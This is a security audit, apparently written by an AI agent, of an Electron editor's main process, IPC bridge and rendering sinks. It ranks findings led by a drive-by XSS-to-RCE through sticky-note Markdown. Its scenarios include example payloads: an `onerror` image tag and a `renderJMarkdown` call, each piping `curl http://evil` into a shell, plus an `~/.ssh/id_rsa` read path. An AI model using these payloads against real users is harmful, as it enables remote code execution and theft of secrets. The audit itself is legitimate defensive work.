# Main process, IPC & security surface — audit

**Auditor:** Agent 6 of 13 (primary security agent — security & IPC first-class, correctness second)
**Date:** 2026-07-01
**Repo/branch:** `/Users/jalex/Source/jmacs/main` @ `efe0fa6d` (main), suite green (3290)
**Electron:** 42.2.0 (`apps/desktop/package.json:26`)

## Scope

| Area | Files read |
|---|---|
| Host entry / lifecycle / windows | `apps/desktop/src/main.js` (517) |
| Context bridge | `apps/desktop/src/preload.mjs` (804), `preview-preload.mjs` (18) |
| Protocol / static serve | `apps/desktop/src/serve.js` (221), `host-allowlist.js` (97) |
| Filesystem IPC | `apps/desktop/src/files.js` (1050), `atomic-write.js`, `metadata.js`, `config-home.js`, `recovery-controller.js`, `recovery.js`, `bdsk-file.js`, `audio-metadata-write.js` |
| Subprocesses | `apps/desktop/src/shell.js` (537), `process.js` (154), `gnuplot.js` (383), `gnuplot-protocol.js` (345), `jmarkdown.js` (75), `jmarkdown-watch.js` (312), `jmarkdown-watch-args.js` (69) |
| Menu / geometry / boot | `apps/desktop/src/menu.js`, `window-geometry.js`, `boot-guard.js` |
| Spine spawn wiring (main side) | `apps/desktop/src/server-bridge.js` (143) |
| Renderer embedding (security side only) | `apps/desktop/index.html`, `packages/renderer/src/browser-view.js`, `packages/renderer/src/markdown-preview.js`, `packages/renderer/src/markdown.js`, `apps/desktop/src/sticky-notes.js`, `apps/desktop/src/app.js` (preview iframe + sticky-note wiring) |
| Electron semantics | `node_modules/.pnpm/electron@42.2.0/.../electron.d.ts` (preload-in-subframes) |

Threat model: hostile file content (cloned repo, downloaded `.md`/`.jmd`/`.mp3`/`.pdf`/`.bib` + travelling `.godot-metadata` sidecars), hostile filenames/paths, hostile web pages in browser-views / preview iframes, and a compromised renderer escalating to main-process powers.

---

## Executive summary (worst first)

1. **MAIN-01 (P0, CONFIRMED) — drive-by RCE via sticky-note Markdown injected with `innerHTML` into the privileged main world.** A file's companion `.godot-metadata` sidecar carries sticky-note source. On open, the renderer renders each note's Markdown through `marked` (no sanitizer) and assigns the result to `bodyEl.innerHTML` **in the editor's top frame** — the frame that holds the full `window.host` bridge. Marked passes inline HTML through verbatim, and the editor CSP allows `'unsafe-inline'`, so a note body of `<img src=x onerror="host.runProcess(...)">` executes arbitrary code the moment the note renders (no click). A downloaded document that ships its sidecar is a one-open compromise.

2. **The `window.host` bridge is a very high-authority API** — arbitrary file read/write/rename/trash, two arbitrary-subprocess spawners (`process:run`, `shell:spawn`+`shell:write`), and one **`shell:true` arbitrary-command runner** (`jmarkdown:render`) — with **no path confinement, no command allowlist, and no sender-frame check**. Its only containment is that Electron does not run the preload in sub-frames (verified — see below), so hostile iframe/webview content cannot reach it. That single fact is doing *all* the security work; MAIN-01 breaks it from inside the top frame, turning any of these into RCE.

3. **The good news, verified end-to-end:** the localhost jmarkdown-preview iframe and the `<browser-view>` webview guests do **not** receive `window.host`. The webview carries no `preload`/`nodeintegration` attribute (`browser-view.js:205-219`), and Electron 42 only loads preloads into sub-frames when `nodeIntegrationInSubFrames` is set (it is not) — confirmed against `electron.d.ts`. Popouts get a deliberately minimal `preview-preload.mjs`. So the remote-content surface is genuinely isolated from the host bridge; the residual RCE risk is *top-frame* HTML injection (MAIN-01), not the iframes themselves.

4. **Defence-in-depth gaps** cluster around navigation and multi-instance: no `setWindowOpenHandler`/`will-navigate` on the editor or popout windows (a top-frame XSS can `window.open` remote content that *inherits* the privileged preload), no `will-attach-webview` sanitizer, no `setPermissionRequestHandler`, no single-instance lock (two instances share `~/.godot` and clobber each other's session/recovery/workspaces), and an unauthenticated server-crash path with no user notification.

**Overall posture.** The architecture is *well-intentioned and mostly correct on the classic Electron checklist* — context isolation on, nodeIntegration off, sandboxed webviews with no preload, atomic writes for every user-data file, a symlink-resolving allowlist for the arbitrary-file serve route, and shell-free `spawn` for the general process runner. But the security model is "trust the top frame absolutely," and the top frame renders **file-derived HTML with `innerHTML` and no sanitizer under a `'unsafe-inline'` CSP**. That combination converts the entire (deliberately unconfined) host bridge into a hostile-file RCE. Fix MAIN-01 (sanitize/sandbox the note+docstring render sinks and drop `'unsafe-inline'`) and the posture flips from "one bad document = game over" to "solid." Everything else in this report is secondary to that.

---

## Findings

### MAIN-01: Drive-by RCE — file-derived Markdown → `innerHTML` in the top frame that owns `window.host`

- **Severity:** P0
- **Dimension:** security (arbitrary code execution from hostile file content)
- **Location:** `apps/desktop/src/sticky-notes.js:245-246` (`setBody` → `bodyEl.innerHTML = html`); render wiring `apps/desktop/src/app.js:7437` (`renderNoteHtml = renderMarkdownHtml`), `app.js:7426-7432` (`renderMarkdownHtml`), `app.js:7440-7459` (`createStickyNotes({ render: renderNoteHtml })`); renderer `packages/renderer/src/markdown.js:99,117` (`marked.parse`, no sanitizer); note source origin `apps/desktop/src/files.js:453-464` (`metadata:read` reads the `.godot-metadata` sidecar); CSP `apps/desktop/index.html:7`.
- **Evidence:**
  - Sticky-note bodies are committed to the DOM raw: `setBody(bodyEl, html) { bodyEl.innerHTML = html; typesetMath(bodyEl); }`. `bodyEl` is a floating note element appended over the editor in the **top frame**, not an iframe.
  - The `render` function is `renderMarkdownHtml` → for the default `*markdown-interpreter*` = `"marked"` it calls `renderMarkdown(source)` (`markdown.js`), which is `new Marked({ gfm:true, breaks:false })` with **no `sanitize`/`hooks`** — marked emits inline HTML in the source verbatim.
  - Note `source` lives in `buffer.metadata.notes[].source`, loaded from the `.NAME.godot-metadata` sidecar via the `metadata:read` handler. Sidecars are explicitly designed to travel next to documents (a cloned repo / downloaded doc bundle can carry one).
  - Notes auto-render when their buffer is shown (`stickyNotes.setBuffer(...)`), so no user interaction beyond opening the document is required.
  - The editor CSP is `script-src 'self' app: 'unsafe-inline' 'wasm-unsafe-eval'` — inline event-handler attributes (`onerror`, `onload`) are permitted, so an injected `<img onerror=…>` fires. (`<script>` inserted via `innerHTML` does not run, but event-handler attributes do — this is the reliable innerHTML-XSS primitive, and it is not blocked here.)
  - The top frame exposes the full bridge: `host.runProcess`, `host.shellSpawn`+`host.shellWrite`, `host.renderJMarkdown` (shell), `host.saveFile`/`renameFile`/`trashFile`, arbitrary sync file reads, etc. (`preload.mjs:11+`).
- **Attack/failure scenario:** Attacker publishes a repo or a "download the manuscript" bundle containing `report.md` and a sibling `.report.md.godot-metadata` whose `notes[0].source` is:
  `` `<img src=x onerror="host.runProcess('run',['/bin/sh','-c','curl http://evil/x|sh'])">` ``
  The victim opens `report.md`. The renderer loads the sidecar, renders the note through marked, assigns the raw HTML to `innerHTML`; the `onerror` fires in the top frame and spawns a shell. Full local code execution as the user, from opening a document.
- **Secondary sinks on the same render path (same root cause):**
  - Live docstring page — `app.js:4926` wires `renderMarkdown: (src) => renderMarkdownHtml(src)`; a docstring is rendered and shown (`hover-doc.js:111 preview.innerHTML = summary.preview`). A hostile `.lisp` defining a function whose docstring contains an event-handler HTML string reaches the same top-frame `innerHTML`. (Lower priority: requires loading hostile Lisp, which is already server-side code, but it is a second unsanitized main-world sink.)
- **Fix direction:** Sanitize rendered Markdown/HTML before it touches a main-world `innerHTML` (a real sanitizer such as DOMPurify, or an allowlist serializer — there is currently **no** `sanitize`/`DOMPurify` anywhere in the tree). Better still, render notes/docstrings **inside a sandboxed iframe** (the existing `markdown-preview.js` uses a `srcdoc` iframe — reuse that isolation for notes) so injected HTML can never see `window.host`. Independently, drop `'unsafe-inline'` from `script-src` (move the two inline `<script>` blocks in `index.html` to files) so injected event handlers are CSP-blocked even if a sink is missed.
- **Confidence:** CONFIRMED (source→sink traced; the only external premise — marked emits inline HTML verbatim — is standard marked behaviour and the code confirms no sanitizer is configured).

---

### MAIN-02: `jmarkdown:render` runs `spawn(command, { shell: true })` on a renderer-supplied command string

- **Severity:** P2 (amplifier; not independently reachable by hostile content, but the most direct RCE primitive once any top-frame code runs, and unconstrained)
- **Dimension:** security (arbitrary shell execution over IPC)
- **Location:** `apps/desktop/src/jmarkdown.js:39` (`child = spawn(command, { shell: true })`); handler `apps/desktop/src/main.js:336-338`; bridge `preload.mjs:231-233`.
- **Evidence:** The handler passes the renderer's `command` straight into `renderJMarkdown`, which does `spawn(command, { shell: true })`. The source is only ever on stdin (safe), but the **command string is fully renderer-controlled** and interpreted by a shell. The file header asserts "the command itself is the user's own configuration and trusted as such" — but nothing in the handler enforces that; it trusts the renderer to only ever pass the configured interpreter. Contrast `process.js:69` which deliberately avoids `shell: true`.
- **Attack/failure scenario:** Any code executing in the top frame (e.g. via MAIN-01) calls `host.renderJMarkdown('curl http://evil|sh', '')` → arbitrary shell command. It is strictly worse than `process:run` because it needs no argv construction and invokes a shell.
- **Fix direction:** Don't `shell: true` a renderer-provided string. Either resolve the interpreter command **in main from trusted config** (read `*markdown-interpreter*` main-side) and spawn it argv-style, or split the configured command into `program`+args and spawn without a shell.
- **Confidence:** CONFIRMED (handler + spawn traced).

---

### MAIN-03: The host bridge is high-authority with no path confinement, command allowlist, or sender check

- **Severity:** P2 (architectural; latent hazard that turns any top-frame compromise into full-system compromise)
- **Dimension:** security (privilege / least-authority)
- **Location:** whole of `preload.mjs`; representative unconfined handlers: `files.js:417` (`file:save` any path), `files.js:988` (`file:rename` any→any), `files.js:1004` (`file:trash` any), `files.js:510/552/560/587` (sync arbitrary file/dir reads), `process.js:50` (`process:run` any program+argv), `shell.js:488/501` (`shell:spawn`/`shell:write` — user shell + arbitrary stdin), `main.js:336` (`jmarkdown:render`, MAIN-02).
- **Evidence:** No handler validates that the path is inside any project/allowed root; `file:save`/`rename`/`trash` operate on any absolute path. No handler checks `event.senderFrame`. There is no allowlist gating which handlers exist (see also MAIN note on `host-allowlist.js` below — that module governs only the `__host__` *serve route*, not IPC). The design is intentional (it is a file editor + terminal + compile loop) and is safe **only** because Electron does not run the preload in sub-frames, so nothing hostile can call these from an iframe/webview.
- **Attack/failure scenario:** Not independently exploitable by hostile content, but it is the blast-radius multiplier for MAIN-01: one top-frame injection reaches every one of these. Also relevant for a future feature that ever loads remote content in the top frame or enables `nodeIntegrationInSubFrames`.
- **Fix direction:** Treat MAIN-01's containment (sandbox the render sinks + drop `'unsafe-inline'`) as the primary control. Longer term, consider confining the mutating fs handlers to opened roots and reading trusted config main-side rather than accepting it from the renderer.
- **Confidence:** CONFIRMED.

---

### MAIN-04: `media://` serves any absolute path with no allowlist (asymmetric with the `__host__` route)

- **Severity:** P2
- **Dimension:** security (unconfined local-file read surface)
- **Location:** `serve.js:210-221` (`serveMediaFile` → `net.fetch(pathToFileURL(decodeURIComponent(url.pathname)))`).
- **Evidence:** The `media://localhost/<abs path>` handler streams **any** path on disk with only a leading-slash check — no `hostPathAllowed` gate, unlike the sibling `app://editor/__host__/…` route which is symlink-resolved and allowlisted (`serve.js:124-141`, `host-allowlist.js`). `media` is registered `standard + secure + supportFetchAPI + stream` (`serve.js:70-84`).
- **Attack/failure scenario:** The top frame can already read any file via `host.readFileTextSync`, so `media://` adds little there. The residual concern is other origins: the localhost preview iframe could `<img src="media://localhost/Users/victim/.ssh/id_rsa">`, but cross-origin reads are opaque (Chromium blocks reading the pixels / cross-scheme `fetch`), so exfiltration is blunted. Still, an unconfined arbitrary-path file server is a latent hazard (e.g. future timing/size side-channels, or a feature that relaxes CORS).
- **Fix direction:** Gate `serveMediaFile` through the same `hostPathAllowed` allowlist the `__host__` route uses.
- **Confidence:** PLAUSIBLE (cross-origin read is opaque; the exposure is defence-in-depth).

---

### MAIN-05: No single-instance lock — two instances share `~/.godot` and clobber session/recovery/workspaces

- **Severity:** P2
- **Dimension:** correctness / data-safety
- **Location:** absent throughout `main.js` (no `app.requestSingleInstanceLock()` / `second-instance`).
- **Evidence:** `grep` finds no `requestSingleInstanceLock`. All config/session/recovery/workspace writes target the shared `~/.godot` (`config-home.js`, `files.js` session/recovery/index handlers, `main.js:433` workspaces store). Two running instances each own a server utilityProcess writing the same `session.json`, `workspaces.json`, and `recovery/` dir.
- **Attack/failure scenario:** User launches a second Godot (or the OS relaunches one while another lingers). Concurrent debounced `session:write` / `recovery:write` / server session writes interleave; last-writer-wins can drop one instance's open-file layout or recovery snapshots. Because writes are atomic *per file*, no single file is torn, but the *set* is inconsistent, and the config-home first-run migration (`config-home.js:96`) / workspaces migration (`main.js:434-442`) can both fire.
- **Fix direction:** `app.requestSingleInstanceLock()` and focus the existing window on `second-instance`; or namespace per-instance state.
- **Confidence:** CONFIRMED (absence).

---

### MAIN-06: No window-open / navigation guard on the editor or popout windows → a top-frame XSS can escape into a preload-privileged remote window

- **Severity:** P2
- **Dimension:** security (defence-in-depth against navigation)
- **Location:** `main.js:269-278` sets `setWindowOpenHandler` **only** for `contents.getType() === 'webview'`; the editor `BrowserWindow` (`main.js:154-186`) and the preview popout window (`main.js:354-368`) have **no** `setWindowOpenHandler` and no `will-navigate`/`will-redirect` handler anywhere.
- **Evidence:** `grep` finds no `will-navigate`/`will-redirect`; `setWindowOpenHandler` is webview-scoped. In Electron 42 a `window.open()` from a frame with no handler creates a child window that **inherits the opener's `webPreferences`, including `preload`** (the privileged host bridge). With no `will-navigate` guard, that window (or the top frame itself) can then be driven to remote content while retaining `window.host`.
- **Attack/failure scenario:** Post-MAIN-01, `window.open('https://evil.example')` yields a window running attacker HTML *with the host bridge attached* — persistent RCE even if the original injection point were later fixed. Independently, it is the standard Electron hardening the checklist calls for.
- **Fix direction:** Add a `setWindowOpenHandler` returning `{ action: 'deny' }` (or an allowlist) to every `BrowserWindow`, and a `will-navigate` handler that blocks navigation away from `app://editor` / the intended URL.
- **Confidence:** CONFIRMED (absence); the inherit-preload behaviour is standard Electron.

---

### MAIN-07: No `will-attach-webview` sanitizer and no permission-request handler

- **Severity:** P2
- **Dimension:** security (defence-in-depth / privacy)
- **Location:** absent (`grep` finds no `will-attach-webview`, `setPermissionRequestHandler`, `setPermissionCheckHandler`).
- **Evidence:** Webview options are trusted as-authored in `browser-view.js` (partition + allowpopups, no preload/nodeintegration — good), but nothing centrally strips `preload`/`nodeIntegration`/`webPreferences` from webview attachments, and the default `session` permission behaviour is left in place. A `<browser-view>` guest (arbitrary web page) can request geolocation / notifications / media / clipboard through the default handler with no app-level gate.
- **Attack/failure scenario:** A hostile page loaded in a browser-view obtains sensitive web permissions without an app-mediated prompt; or a future code path introduces a webview whose attributes aren't sanitized centrally.
- **Fix direction:** Handle `web-contents-will-attach-webview` to delete `preload` and force `nodeIntegration:false`; add `session.setPermissionRequestHandler` denying by default (or prompting) for browser-view partitions.
- **Confidence:** CONFIRMED (absence).

---

### MAIN-08: `file:rename` overwrites an existing destination silently (data loss)

- **Severity:** P2
- **Dimension:** correctness / data-safety
- **Location:** `files.js:988-1000` (`await rename(from, to)` unconditionally).
- **Evidence:** The handler calls `fs.promises.rename(from, to)` directly. POSIX `rename` **overwrites** an existing regular-file destination without error; the handler's own comment ("name collisions are the common one [failure]") assumes rename *fails* on collision, which is only true for non-empty-directory targets, not file→file. There is no existence check, no change-tracker consultation, and no trash step.
- **Attack/failure scenario:** Via the directory-tree Rename context menu, renaming `a.txt` to the name of an existing `b.txt` silently destroys `b.txt`. If the renderer's pre-check is bypassed, races, or is absent for some entry types, the user loses `b.txt` with no warning and no recovery (not sent to Trash). (Agent 12 owns the directory-view UI; the main handler is unsafe on its own regardless.)
- **Fix direction:** In the handler, `stat(to)` first and refuse (return `{ ok:false, error:'exists' }`) unless an explicit `force`/overwrite flag is passed; or use a rename that fails on collision.
- **Confidence:** PLAUSIBLE (depends on whether the renderer always pre-checks; the main handler is unconditionally overwriting).

---

### MAIN-09: gnuplot SVG sanitisation is regex-based and misses SVG event handlers / `<foreignObject>`; SVG is then `innerHTML`'d into the main world

- **Severity:** P2
- **Dimension:** security (incomplete sanitisation on a main-world sink)
- **Location:** `gnuplot.js:201-203` (`stripScripts` = `svg.replace(/<script\b[\s\S]*?<\/script>/gi,'')`); consumed at `finishSubmission` `gnuplot.js:166-176`; rendered `packages/renderer/src/gnuplot-view.js:318` (`plot.innerHTML = payload.svg`). User text is passed to gnuplot verbatim (`gnuplot-protocol.js:199`).
- **Evidence:** `stripScripts` removes only `<script>` elements. SVG can execute JS via attribute handlers (`onload`, `onclick`, `onbegin` on `<animate>`), `<a xlink:href="javascript:…">`, and `<foreignObject>` HTML — none stripped. The cleaned SVG is inlined into a main-world element that has `window.host`.
- **Attack/failure scenario:** A gnuplot program that emits an SVG containing an `onload` handler executes in the main world. Reaching it requires the user to run the malicious gnuplot commands (self-inflicted in normal use) — but a future "run the plots embedded in this document" feed would make it hostile-content-driven.
- **Fix direction:** Render the plot SVG inside a sandboxed iframe (as with notes), or sanitise with a real SVG sanitiser rather than a `<script>`-only regex.
- **Confidence:** PLAUSIBLE (currently user-driven).

---

### MAIN-10: The gnuplot REPL passes user text verbatim to gnuplot, which supports `system()` and `set output`

- **Severity:** P3 (inherent to a gnuplot REPL; user-driven)
- **Dimension:** security (note)
- **Location:** `gnuplot-protocol.js:181-213` (`buildSubmission` embeds `userText` unmodified); `shell.js`-style spawn `gnuplot.js:237`.
- **Evidence:** gnuplot commands run with full gnuplot capability, including `system('…')` (shell out) and `set output '…'` (write arbitrary files). This is expected for a gnuplot notebook and is the user's own input.
- **Attack/failure scenario:** Only relevant if plot text ever originates from untrusted file content that is auto-executed. Today it is typed by the user.
- **Fix direction:** If a "run embedded plots" feature is ever added, gate or sandbox it. No action needed for the interactive REPL.
- **Confidence:** CONFIRMED (behaviour), P3 by reachability.

---

### MAIN-11: `config:write` filename regex accepts `..`

- **Severity:** P3
- **Dimension:** security (hardening)
- **Location:** `files.js:184` (`/^[\w.-]+$/`).
- **Evidence:** `.` is in the class, so the name `..` matches. `configPath('..')` → `join(configHome, '..')` = the config home's parent. However, the regex forbids `/`, so a caller cannot form `../child`; writing to the bare parent path fails at `atomicWrite` (the target is a directory → rename EISDIR/ENOTEMPTY). Not exploitable to write outside the config home, but the guard should be tightened.
- **Fix direction:** Reject `.` and `..` explicitly (e.g. add `&& name !== '.' && name !== '..'`).
- **Confidence:** CONFIRMED (regex), non-exploitable.

---

### MAIN-12: Durability gaps — no directory fsync after rename; non-atomic workspace/preview writes

- **Severity:** P3
- **Dimension:** data-safety (durability, not corruption)
- **Location:** `atomic-write.js:36-66` (fsyncs the file, not its parent dir); `audio-metadata-write.js:1042-1045` (`writeFileSync` temp then `renameSync`, no fsync); `main.js:437` (`copyFileSync(legacyStore, workspaceStore)`, non-atomic); `jmarkdown-watch.js:165` (`writeFileSync(candidate, seedText)` for the preview shadow — throwaway, acceptable).
- **Evidence:** `atomicWrite` flushes the data file before rename (good — never torn), but does not fsync the containing directory, so a power loss immediately after rename can, on some filesystems, revert to the *old* complete contents (atomicity preserved, latest-version durability not guaranteed). The workspaces migration `copyFileSync` is not atomic: a crash mid-copy could leave a truncated `workspaces.json`; it is guarded (`!existsSync(dest)` + try/catch) but a partial file, once present, is not re-copied and the server must tolerate a parse failure.
- **Fix direction:** Optionally fsync the directory after rename in `atomicWrite`; route the workspaces migration through `copyFile` to a temp + atomic rename (or `atomicWrite` of the parsed contents).
- **Confidence:** CONFIRMED; low impact (config/session state, not user documents; documents use the fully-flushed `atomicWrite`).

---

### MAIN-13: The `__host__` serve allowlist grows monotonically and is never revoked

- **Severity:** P3
- **Dimension:** security (hardening / note)
- **Location:** `serve.js:62,187`; `files.js:258` (`allowHostDir(dirname(path))` on every open); `host-allowlist.js` (a `Set` that only grows; `resetHostRootsForTest` is test-only).
- **Evidence:** Every opened file vouches for its directory for the life of the process; the set is never pruned. By end of a long session the route can serve most directories the user has touched. Impact is bounded because (a) only the top frame can fetch `app://` same-origin and it can already read any file via `host.*`, and (b) cross-origin fetches from the localhost preview iframe to `app://` are blocked. The realpath-based boundary check itself is correct (`pathUnderAnyRoot` guards `/a/bee` vs `/a/b`, symlinks resolved).
- **Fix direction:** None urgent; consider scoping vouches to the active buffer's dir and pruning on close.
- **Confidence:** CONFIRMED, low impact.

---

### MAIN-14: Editor CSP allows `'unsafe-inline'` scripts (the enabler for MAIN-01) and broad `frame-src`

- **Severity:** P2 (structural mitigation for MAIN-01)
- **Dimension:** security (hardening)
- **Location:** `apps/desktop/index.html:7`.
- **Evidence:** `script-src 'self' app: 'unsafe-inline' 'wasm-unsafe-eval'`. `'unsafe-inline'` is what lets injected event-handler attributes (MAIN-01) execute; without it, innerHTML-injected `onerror`/`onload` would be CSP-blocked. Two inline `<script>` blocks in `index.html` (the MathJax config and the tex-svg loader tag) are the reason it is present. `frame-src` also allows `https:` and `http://localhost:*` / `http://127.0.0.1:*` (the preview iframe needs localhost; arbitrary `https:` framing is broader than required).
- **Fix direction:** Move the two inline scripts to files and drop `'unsafe-inline'` from `script-src`; narrow `frame-src` to the schemes actually used. This does not by itself fix MAIN-01 (still sanitise/sandbox the sinks) but removes the inline-handler execution primitive.
- **Confidence:** CONFIRMED.

---

### MAIN-15: Server (spine) crash is only logged — no restart, no user notification

- **Severity:** P2
- **Dimension:** correctness / availability / data-safety
- **Location:** `server-bridge.js:87-91` (`child.on('exit', code => log(...))`); no respawn; no `webContents.send` to warn the renderer.
- **Evidence:** In Model B the buffers live in the utilityProcess. On its `exit` the bridge only logs `[godot-server] server exited (code N)` ("Respawn orchestration is a later phase"). Windows remain open as thin clients talking to a dead port; dispatch and buffer operations silently stop.
- **Attack/failure scenario:** A server crash (e.g. an unhandled condition triggered by a crafted file the server parses) leaves the editor visibly alive but non-functional, with no dialog. Unsaved edits since the last autosave debounce are lost; the user is not told the backend died. A hostile file that reliably crashes the server is a denial-of-service / silent-work-loss vector.
- **Fix direction:** On unexpected server exit, notify the focused window (a recovery banner) and/or respawn-and-reattach; at minimum surface it in the UI rather than only stderr.
- **Confidence:** CONFIRMED (main-side); the crash-trigger surface is agent 2/3's (server) territory.

---

## IPC surface inventory

**Reachability note (applies to every row): all channels are reachable only from the editor window's TOP frame.** Sub-frames (the localhost preview iframe, `srcdoc` note iframes) cannot send IPC — Electron 42 loads the preload and enables frame IPC only under `nodeIntegrationInSubFrames`, which is not set (verified `electron.d.ts`; editor `webPreferences` `main.js:162-185`). `<browser-view>` webview guests get their own context with **no** preload (`browser-view.js:205-219`) and no `window.host`. The popout window gets the minimal `preview-preload.mjs` (only `up`/`onDown`). So "exposed to" = **editor top frame** for all `host.*`; the popout window exposes only the two preview-sync relays.

### `preload.mjs` → `host.*` (main editor top frame only)

| Channel (host method) | Validation in handler | Worst-case power |
|---|---|---|
| `file:open` / `directory:open` / `project:pick-image` (dialogs) | user-driven native dialog | reads a user-chosen path |
| `file:open-path` `openFilePath` | type check only; `expandTilde`; **any path** | arbitrary file read (routed by suffix) |
| `file:save` `saveFile` | change-tracker conflict guard; `atomicWrite`; **any path** | **arbitrary file write** (atomic) |
| `file:rename` `renameFile` | type check only; **overwrites dest** (MAIN-08) | **arbitrary move + silent overwrite** |
| `file:trash` `trashFile` | type check only; **any path** | move any path to Trash (recoverable) |
| `file:reveal` `revealInFolder` | type check; `shell.showItemInFolder` | reveal any path in Finder |
| `file:read-text-sync` / `file:exists-sync` | `expandTilde`; **any path** | arbitrary file read / existence probe |
| `directory:list[-sync/-detailed-sync/-with-types-sync]` | `expandTilde`; dot-filtered | arbitrary directory listing |
| `metadata:read` / `metadata:write` | sidecar path derived from file path; `atomicWrite` | read/write `.godot-metadata` next to any file |
| `config:read` / `config:write` | name `/^[\w.-]+$/` (accepts `..`, MAIN-11); `atomicWrite` | read/write files in `~/.godot` |
| `panes/faces/session/project/project-index [read/write]` | `atomicWrite`; project root must be absolute | read/write config + per-project `.godot/*.json` at any absolute root |
| `project:thumbnail` | image suffix + 8 MB cap | read small image as data URL |
| `recovery:write/list/delete/clear` | key non-empty; `atomicWrite`; `recoveryFileName` sanitises key | read/write/delete `~/.godot/recovery/*` |
| `doc:manifest` / `doc:read` | resolves name→relpath; **confined to `docs/build/`** (`files.js:974`) | read built docs only (boundary-checked) |
| `audio:metadata[-sync]` / `audio:album-art` | `expandTilde`; any path | read audio tags/art |
| `audio:metadata-write-sync` | temp+rename (atomic) | **write tags to any audio file** |
| `bdsk:open` | resolves base64 plist → path; `isOpenableFile` rejects non-regular files & `.app`; then `shell.openPath` | open an attacker-influenced document in its OS default app (MAIN note below) |
| `jmarkdown:render` `renderJMarkdown` | **none — `spawn(command,{shell:true})`** (MAIN-02) | **arbitrary shell command** |
| `jmarkdown:watch:start/sync/stop` | path string; spawns `jmarkdown watch <path> --port N` (argv, no shell) | spawn preview server on a path; write preview shadow sidecar |
| `jmarkdown:watch:popout` | validates a watcher exists; opens popout window | create popout window bound to the watcher |
| `process:run` `runProcess` | `runId`+`program` required; **no shell**; arbitrary program+argv+cwd | **arbitrary subprocess** (no shell metachar interpretation) |
| `process:kill` | by runId | SIGTERM a spawned run |
| `shell:spawn` `shellSpawn` | sessionId; spawns `$SHELL -i` under python-pty; cwd from renderer | **interactive shell process** as the user |
| `shell:write/signal/end-input/resize/kill` | sessionId | **write arbitrary bytes to the shell's stdin** (= run commands) |
| `gnuplot:spawn/write/signal/kill/set-theme` | sessionId; spawns `gnuplot`; user text verbatim (MAIN-09/10) | gnuplot process incl. `system()` / `set output` |
| `gnuplot:save-svg` | Save dialog; `atomicWrite` | write SVG to a chosen path |
| `window:new/close/set-bounds/get-bounds` | geometry reconciled main-side | open/close/resize windows |
| `menu:set` | stores per-window spec | rebuild the app menu from renderer-supplied labels |
| `app:quit` | marks quit confirmed | quit the app |
| `userdata:dir-sync` (returns configHome) | — | read the config-home path |
| `host:allow-file-sync` `allowHostFile` | `expandTilde`; realpath | **widen the `__host__` serve allowlist** to a file's real dir |
| `preview-sync:down/up` | webContents-id routed | relay scroll/inverse-search between editor and popout |
| `godot:server-port` (main→renderer) | transfers a MessagePort | connect the renderer to the spine |

### `preview-preload.mjs` → `host.*` (popout preview window only)

| Channel | Worst-case power |
|---|---|
| `preview-sync:up` (`up`) | send `{type,line}` to the editor (scroll / inverse search) — benign effect |
| `preview-sync:down` (`onDown`) | receive scroll-to-line from the editor |

### Non-IPC bridge surface

- `clipboardReadText` / `clipboardWriteText` (`preload.mjs:39,44`) — read/write the system clipboard synchronously (top frame).
- `getPathForFile` (`preload.mjs:437`) — `webUtils.getPathForFile` (resolve a dropped `File`'s path).
- `homeDirectory`, `userDataDirectory`, `serverMode` — static values.

**On `host-allowlist.js` (audit question 3):** it is **not** an IPC gate. It backs only the `app://editor/__host__/<abspath>` *serve route* (`serve.js:124-141`): a realpath-resolved `Set` of directories the main process has vouched for, checked by `hostPathAllowed`. Every `ipcMain.handle/on` (69 total, enumerated) is registered unconditionally — there is no per-handler allowlist, and none is claimed. The allowlist's job (stop an opened document from `fetch('app://editor/__host__/etc/passwd')`) is correctly done: `pathUnderAnyRoot` enforces `root/` boundaries and `realpathSync` defeats planted symlinks. Its only weaknesses are monotonic growth (MAIN-13) and that the sibling `media://` route has no equivalent gate (MAIN-04).

---

## Architecture observations

- **The isolation boundary is real and correctly placed.** contextIsolation on, nodeIntegration off, sandbox off only because the preload is ESM (documented), webviewTag on but guests get no preload, popout gets a minimal preload. The preload exposes an explicit named API (no `ipcRenderer` passthrough, no dynamic-channel exposure — the only raw-channel forward is the inbound `godot:server-port` MessagePort transfer, which is correct). This is a good context-bridge design.
- **The single load-bearing assumption is "the top frame is trusted."** Everything hinges on no hostile code running in `app://editor`'s main world. MAIN-01 violates it via an unsanitised `innerHTML` fed by file-derived Markdown. The whole report's severity ordering follows from this: the bridge's breadth (MAIN-03) is fine *iff* the top frame is clean, and MAIN-01 is what dirties it.
- **`process:run` gets the shell-free treatment right** (`spawn` with argv, explicit "no `shell:true`" rationale) — this is the correct pattern. `jmarkdown:render` (MAIN-02) and `renderJMarkdown` are the lone `shell:true` in the tree and should be brought in line.
- **Subprocess reaping is careful.** shell (`shell.js` SIGTERM→SIGKILL backstop, SIG_IGN reset in the python helper), jmarkdown-watch (per-window slot with identity-checked reaping, HTTP-200 readiness — verified at `jmarkdown-watch.js:98`, not a bare TCP probe), and gnuplot (per-session temp dir + `rm` on exit) all avoid orphans, and `will-quit` reaps watchers + disposes the server. The "process-reaping backlog" concern is largely addressed for these three; the gap is the *server itself* has no respawn (MAIN-15).
- **Data-safety is a clear strength.** Every user-data write (`file:save`, metadata, faces, panes, session, project, project-index, recovery, audio tags, gnuplot SVG save) goes through an atomic temp+fsync+rename (`atomic-write.js` / `audio-metadata-write.js`). The change-tracker (`external-change.js`) guards `file:save` against silently clobbering an external edit. The only raw `writeFileSync` calls are the throwaway preview shadow and the (guarded) workspaces migration. The one real data-loss risk is `file:rename`'s silent overwrite (MAIN-08).
- **`bdsk:open` is reasonably careful for a `shell.openPath` sink:** it rejects non-regular files and `.app` bundles (`bdsk-file.js:101-108`) before opening, so a crafted `Bdsk-File-N` bookmark can't launch an application — but it can still point `shell.openPath` at an attacker-chosen *document* (resolved from base64 plist in a hostile `.bib`), which then opens in its OS default handler. That is a narrower version of "hostile file content triggers an OS open"; worth noting though the `.app`/directory guard blunts the worst case. (Bundled under observations, not a separate P-rated finding, because the guard is present and the effect is "open a document in Preview/etc.")
- **The popout/preview relay** routes `preview-sync:*` by `webContents.id` maps in main; messages are effect-limited (scroll to a line), and only the trusted popout page (with `preview-preload`) can emit them — the embedded localhost iframe cannot. Low risk.

---

## Test coverage

- **Present and useful:** `host-allowlist` boundary logic is unit-tested (`pathUnderAnyRoot` / `resetHostRootsForTest`); `window-geometry.test.js` covers reconciliation; `server-bridge.test.js` asserts the fork config + port dance with fakes; `jmarkdown-watch.test.js` covers the pure arg/env builders; `gnuplot-protocol.js` and `atomic-write.js` are structured to be unit-testable and exercised.
- **Gaps relevant to this audit:**
  - No test asserts that rendered note/docstring HTML is sanitised before `innerHTML` (MAIN-01) — there is no sanitiser to test.
